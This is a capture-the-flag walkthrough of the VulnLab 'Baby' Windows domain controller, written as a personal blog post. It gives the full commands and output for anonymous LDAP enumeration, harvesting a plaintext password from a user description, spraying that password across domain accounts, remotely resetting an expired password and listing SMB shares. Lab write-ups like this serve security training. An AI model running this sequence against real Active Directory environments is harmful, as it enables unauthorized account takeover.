---
title: "Baby Walkthrough"
date: 2024-10-02 14:06:00 +0530
categories: [Capture the Flags, Windows]
tags: [vulnlab]     # TAG names should always be lowercase
description: "Testing"
---


Started with a standard NMAP scan to discover open ports. 
```
sudo nmap 10.10.75.4 -sS -n --disable-arp-ping --top-ports=1000 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-30 09:43 EDT
Nmap scan report for 10.10.75.4
Host is up (0.16s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server
5357/tcp open  wsdapi
```
I can see SMB port is open for connections, enumerated further using smbclient as shown below
```
netexec smb 10.10.75.4
[*] First time use detected
[*] Creating home directory structure
[*] Creating missing folder logs
[*] Creating missing folder modules
[*] Creating missing folder protocols
[*] Creating missing folder workspaces
[*] Creating missing folder obfuscated_scripts
[*] Creating missing folder screenshots
[*] Creating default workspace
[*] Initializing LDAP protocol database
[*] Initializing SMB protocol database
[*] Initializing WMI protocol database
[*] Initializing FTP protocol database
[*] Initializing RDP protocol database
[*] Initializing SSH protocol database
[*] Initializing MSSQL protocol database
[*] Initializing VNC protocol database
[*] Initializing WINRM protocol database
[*] Copying default configuration file
SMB         10.10.75.4      445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False)
```
It appears to be DC has been exposed. Checking if there’s a possibility for Domain Enumeration

Tried using “powerview”, it didn’t work. As we can see, the ports “389” and “636” is open which are default ports for LDAP. One can leverage LDAPSearch to enumerate further.

Since we don’t have credentials for the AD “baby.vl”, we can use null credentials to verify if we can access the data as shown below

```
ldapsearch -x -H ldap://10.10.75.4 -D '' -w '' -b "DC=baby,DC=vl" | grep "distinguishedName" 
distinguishedName: CN=Guest,CN=Users,DC=baby,DC=vl
distinguishedName: CN=Domain Computers,CN=Users,DC=baby,DC=vl
distinguishedName: CN=Cert Publishers,CN=Users,DC=baby,DC=vl
distinguishedName: CN=Domain Users,CN=Users,DC=baby,DC=vl
distinguishedName: CN=Domain Guests,CN=Users,DC=baby,DC=vl
distinguishedName: CN=Group Policy Creator Owners,CN=Users,DC=baby,DC=vl
distinguishedName: CN=RAS and IAS Servers,CN=Users,DC=baby,DC=vl
distinguishedName: CN=Allowed RODC Password Replication Group,CN=Users,DC=baby
distinguishedName: CN=Denied RODC Password Replication Group,CN=Users,DC=baby,
distinguishedName: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=baby
distinguishedName: CN=Cloneable Domain Controllers,CN=Users,DC=baby,DC=vl
distinguishedName: CN=Protected Users,CN=Users,DC=baby,DC=vl
distinguishedName: CN=DnsAdmins,CN=Users,DC=baby,DC=vl
distinguishedName: CN=DnsUpdateProxy,CN=Users,DC=baby,DC=vl
distinguishedName: CN=dev,CN=Users,DC=baby,DC=vl
distinguishedName: CN=Jacqueline Barnett,OU=dev,DC=baby,DC=vl
distinguishedName: CN=Ashley Webb,OU=dev,DC=baby,DC=vl
distinguishedName: CN=Hugh George,OU=dev,DC=baby,DC=vl
distinguishedName: CN=Leonard Dyer,OU=dev,DC=baby,DC=vl
distinguishedName: CN=it,CN=Users,DC=baby,DC=vl
distinguishedName: CN=Connor Wilkinson,OU=it,DC=baby,DC=vl
distinguishedName: CN=Joseph Hughes,OU=it,DC=baby,DC=vl
distinguishedName: CN=Kerry Wilson,OU=it,DC=baby,DC=vl
distinguishedName: CN=Teresa Bell,OU=it,DC=baby,DC=vl
```

People could leave passwords in the description as shown below
```
ldapsearch -x -H ldap://10.10.75.4 -D '' -w '' -b "CN=Teresa Bell,OU=it,DC=baby,DC=vl"
# extended LDIF
#
# LDAPv3
# base <CN=Teresa Bell,OU=it,DC=baby,DC=vl> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# Teresa Bell, it, baby.vl
dn: CN=Teresa Bell,OU=it,DC=baby,DC=vl
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Teresa Bell
sn: Bell
description: Set initial password to BabyStart123!
givenName: Teresa
distinguishedName: CN=Teresa Bell,OU=it,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121151108.0Z
whenChanged: 20211121151437.0Z
displayName: Teresa Bell
uSNCreated: 12889
memberOf: CN=it,CN=Users,DC=baby,DC=vl
uSNChanged: 12905
name: Teresa Bell
objectGUID:: EDGXW4JjgEq7+GuyHBu3QQ==
userAccountControl: 66080
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132819812778759642
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWWgQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: Teresa.Bell
sAMAccountType: 805306368
userPrincipalName: Teresa.Bell@baby.vl
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=baby,DC=vl
dSCorePropagationData: 20211121163014.0Z
dSCorePropagationData: 20211121162927.0Z
dSCorePropagationData: 16010101000416.0Z
msDS-SupportedEncryptionTypes: 0

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```
Tried RDP with the potential obtained password, it didn’t work for “teresa.bell@baby.vl”. Alternatively we can check if this password used for other users. Enumerating email address as shown below
```
ldapsearch -x -H ldap://10.10.75.4 -D '' -w '' -b "DC=baby,DC=vl" | grep "userPrincipalName"
userPrincipalName: Jacqueline.Barnett@baby.vl
userPrincipalName: Ashley.Webb@baby.vl
userPrincipalName: Hugh.George@baby.vl
userPrincipalName: Leonard.Dyer@baby.vl
userPrincipalName: Connor.Wilkinson@baby.vl
userPrincipalName: Joseph.Hughes@baby.vl
userPrincipalName: Kerry.Wilson@baby.vl
userPrincipalName: Teresa.Bell@baby.vl
# Caroline Robinson, it, baby.vl
dn: CN=Caroline Robinson,OU=it,DC=baby,DC=vl
```
There’s no principal name associated with “Caroline Robinson”, which standout’s from these.

There’s a tool named netexec, which is a continuation of Crackmapexec. If any credentials, such as a username and password, are found during enumeration, Crackmapexec verifies their validity. Since we have username and password, we could use the same to validate credentials via SMB.
```
netexec smb 10.10.75.4 -u emails.txt -p 'BabyStart123!'                          
SMB         10.10.75.4      445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False)
SMB         10.10.75.4      445    BABYDC           [-] baby.vl\Jacqueline.Barnett:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.10.75.4      445    BABYDC           [-] baby.vl\Ashley.Webb:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.10.75.4      445    BABYDC           [-] baby.vl\Hugh.George:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.10.75.4      445    BABYDC           [-] baby.vl\Leonard.Dyer:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.10.75.4      445    BABYDC           [-] baby.vl\Connor.Wilkinson:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.10.75.4      445    BABYDC           [-] baby.vl\Joseph.Hughes:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.10.75.4      445    BABYDC           [-] baby.vl\Kerry.Wilson:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.10.75.4      445    BABYDC           [-] baby.vl\Teresa.Bell:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.10.75.4      445    BABYDC           [-] baby.vl\Connor.Wilkinson:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.10.75.4      445    BABYDC           [-] baby.vl\it:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.10.75.4      445    BABYDC           [-] baby.vl\Caroline.Robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE 
```
Since there’s a “STATUS_PASSWORD_MUST_CHANGE”, one cannot simply login with the compromised password. Tried logging into rdp, unfortunately it didn’t get through. Resetting an Expired Password Remotely – n00py Blog - Leveraged the tool “smbpasswd” in-built kali linux tool to reset the password as shown below
```
smbpasswd -r 10.10.75.4 -U "Caroline.Robinson"
Old SMB password:
New SMB password:
Retype new SMB password:
Password changed for user Caroline.Robinson
```
There was a break and resumed the pwning with the new machine IP “10.10.88.2”. 

Listing SMB shares by authenticating to DC using compromised credentials as show below
```
smbclient -U 'Caroline.Robinson%Password123' -L //10.10.88.2/Admin$

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.88.2 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
Connecting to the shares, no luck for ADMIN$ but able to connect C$ as shown below
```
smbclient -U 'Caroline.Robinson' \\\\10.10.88.2\\ADMIN$ 
Password for [WORKGROUP\Caroline.Robinson]:
session setup failed: NT_STATUS_LOGON_FAILURE
```